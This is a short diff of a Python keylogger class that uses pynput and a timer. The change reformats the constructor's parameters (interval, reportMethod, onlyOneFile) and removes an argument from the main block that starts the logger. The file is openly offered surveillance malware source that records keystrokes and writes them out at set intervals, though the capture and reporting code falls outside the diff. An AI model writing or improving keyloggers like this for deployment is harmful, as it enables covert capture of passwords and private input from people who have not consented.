@@ -3,7 +3,11 @@ from threading import Timer
 from pynput.keyboard import Listener, Key
 
 class Keylogger:
-    def __init__(self, interval : int = 60, reportMethod : str = "file", onlyOneFile : bool = False):
+    def __init__(
+        self, interval : int = 60,
+        reportMethod : str = "file",
+        onlyOneFile : bool = False
+    ):
         self.interval = interval
         self.reportMethod = reportMethod
         self.log = ""                           # Contains the log of all the keystrokes within `self.interval`
@@ -83,6 +87,5 @@ class Keylogger:
 if __name__ == "__main__":
     Keylogger(
         interval=5,
-        reportMethod="file",
         onlyOneFile=True
     ).start()
